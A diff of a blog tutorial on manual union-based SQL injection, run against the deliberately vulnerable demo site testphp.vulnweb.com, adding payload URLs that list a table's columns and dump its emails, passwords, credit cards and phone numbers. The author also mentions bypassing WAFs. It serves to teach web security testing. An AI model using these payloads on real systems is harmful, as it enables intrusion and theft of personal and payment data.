@@ -1,5 +1,9 @@
 <h2>EXPLOITING UNION BASED SQL INJECTION MANUALLY</h2>
 
+Hey Guys,
+
+It's [0xvenus](https://twitter.com/0x_venus) again
+
 HERE I SHOWCASE HOW TO PERFORM A BASIC UNION BASED SQL INJECTION (MANUALLY)
 
 KINDLY CHECK NEXT POST FOR ADVANCED UNION BASED SQLI WHERE I SHOWED HOW TO BYPASS SOME WAFS AND FILTERS
@@ -115,21 +119,46 @@ NB: remember to keep increasing the number of limit after the query
 
 so to get the columns in a shot we can use
 
-```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273+AND+TABLE_SCHEMA=DATABASE())```
+```(SELECT+GROUP_CONCAT(column_name+SEPARATOR+'::')+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users'+AND+TABLE_SCHEMA=DATABASE())```
 
-NB: I hex encoded the table name *users* to avoid errors
+NB: set the value of the TABLE_NAME= to the table you are t5rying to get it columns
 
 ![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/c70af46f-e483-4d4e-a33a-88a78bd5524e)
 
 As you can see we have the columns in the users table which are emails,creditcards,address,password e.t.c
 
-```http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7573657273+AND+TABLE_SCHEMA=DATABASE()),3```
+```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+%27::%27)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='users'+AND+TABLE_SCHEMA=DATABASE()),3
 
 let's proceed to the next step
 
 **STEP 9** 
 
-``dumping the juicy contents of the database like passwords,emails,creditcards e.t.c``
+``dumping the juicy contents of the database like here we have columns; passwords,emails,creditcards e.t.c in the users table``
+
+
+```http://testphp.vulnweb.com/artists.php?artist=-1+union+select+1,(SELECT+GROUP_CONCAT(email,'::',%20pass,'::',%20name,'::',%20cc,'::',uname,'::',%20phone%20+SEPARATOR+'::')+FROM+users%20),3
+```
+
+![image](https://github.com/0xVenus/0xVenus.github.io/assets/97831939/4c5bc588-ce79-42e1-88a0-0d81313663af)
+
+NB: i added the column names in a table to be able to dump it contents
+
+so. note down the columns a table then replace them in the payload.
+
+
+*Ps: union based SQLi is helpful because sqlmap cant bypass all Wafs and filters but you can, the success rate in dumping the database is high by doing it manually*
+
+
+Thanks 
+
+reach out to me on [Twitter](https://twitter.com/0x_venus) for any question
+
+see you in the next post.
+
+
+
+
+
 
 
 
